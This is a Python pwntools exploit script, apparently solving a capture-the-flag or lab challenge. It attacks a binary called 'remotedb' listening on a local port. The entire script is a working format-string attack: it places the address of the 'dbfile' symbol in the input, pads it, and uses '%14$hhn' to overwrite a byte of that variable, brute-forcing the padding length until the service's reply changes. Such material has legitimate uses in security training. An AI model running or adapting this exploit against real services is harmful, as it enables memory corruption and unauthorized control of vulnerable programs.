from pwn import *
import sys
import time

def skip_header(conn):
    conn.recvline()
    conn.recvline()
    conn.recvline()
    conn.recvline()


host = "localhost"
port = 10000

elf = ELF("remotedb", checksec=False)
dbfile = elf.symbols["dbfile"]
licensefile = elf.symbols["licencefile"]

for i in range(0,256,1):
    try:
        time.sleep(0.1)
        print(".", end="\r")
        buf = p32(dbfile) 
        buf += b"A"*(i) + b"%14$hhn" + b"\n"
        buf += b"FND Team\n"
        conn = remote(host, port)
        skip_header(conn)
        conn.send(buf)
        line = conn.recvline()
        line = conn.recvline()
        if "Team" in str(line):
            print(line)
            break
    except:
        time.sleep(0.2)
        continue

